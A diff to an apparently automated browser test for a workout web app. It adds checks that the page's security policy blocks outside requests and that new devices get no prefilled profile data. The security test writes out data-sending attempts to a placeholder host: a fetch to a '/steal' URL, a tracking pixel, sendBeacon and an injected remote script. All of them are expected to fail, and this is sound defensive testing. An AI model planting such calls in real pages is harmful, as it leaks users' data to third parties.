@@ -35,5 +35,20 @@ ok("Offline right after the update: newest version and the workout are still the
 await BR.offline(ctx,false);await p.evaluate(()=>{writeSessionEnd(null);clearView();go()});
 served="9999-next2";await p.evaluate(()=>upd());await p.waitForFunction(()=>typeof VER!=="undefined"&&VER==="9999-next2",null,{timeout:8000});
 ok("No workout in progress: the update applies by itself",await p.evaluate(()=>VER==="9999-next2"));
+// ===== security: the page may only talk to its own address; no one's profile values are prefilled =====
+const sec=await p.evaluate(async()=>{window.__cspTest=true;const blocked=[];const h=e=>blocked.push(e.violatedDirective||e.effectiveDirective);document.addEventListener("securitypolicyviolation",h);
+  let fetchOk=true;try{await fetch("https://example.com/steal?x=1")}catch{fetchOk=false}
+  const img=new Image();img.src="https://example.com/pixel.gif";try{navigator.sendBeacon("https://example.com/b","x")}catch{}
+  const sc=document.createElement("script");sc.src="https://example.com/x.js";document.head.appendChild(sc);
+  const has=d=>blocked.some(x=>x.startsWith(d));for(let i=0;i<300&&!(has("connect-src")&&has("img-src")&&has("script-src"));i++)await new Promise(r=>requestAnimationFrame(r));
+  for(let i=0;i<10;i++)await new Promise(r=>requestAnimationFrame(r));document.removeEventListener("securitypolicyviolation",h);window.__cspTest=false;
+  const own=await fetch(location.pathname+"?nocache=1").then(r=>r.ok).catch(()=>false);
+  return{fetchOk,blocked:[...new Set(blocked)].sort(),own,meta:!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')}});
+ok("Security policy: sending data to another site is blocked (fetch, image, outside script)",sec.meta&&!sec.fetchOk&&["connect-src","img-src","script-src"].every(d=>sec.blocked.some(x=>x.startsWith(d))),JSON.stringify(sec));
+ok("…while the app's own update check still reaches its address",sec.own);
+const ctxN=await b.newContext({...BR.dev("iPhone SE"),locale:"fr-FR"});await ctxN.addInitScript(IOS);const q=await ctxN.newPage();await q.goto(url);
+const fresh=await q.evaluate(()=>({m:[S.d.M.pf.age,S.d.M.pf.h,S.d.M.pf.w],f:[S.d.F.pf.age,S.d.F.pf.h,S.d.F.pf.w],txt:document.getElementById("v").textContent,nd:window.__nd.length}));
+ok("A new phone gets no one's age, height or weight prefilled and is asked to complete the profile",fresh.m.every(x=>x==null)&&fresh.f.every(x=>x==null)&&fresh.txt.includes("Complète ton profil")&&fresh.nd===0,JSON.stringify({m:fresh.m,f:fresh.f}));
+await ctxN.close();
 ok("No native dialogs or page errors",!errs.length&&await p.evaluate(()=>(window.__nd||[]).length===0),errs.join(" | "));
 console.log(`\n${R.length-fails}/${R.length} passed`);await b.close();server.close();process.exit(fails?1:0)})().catch(e=>{console.log("CRASH",e.message);process.exit(2)});
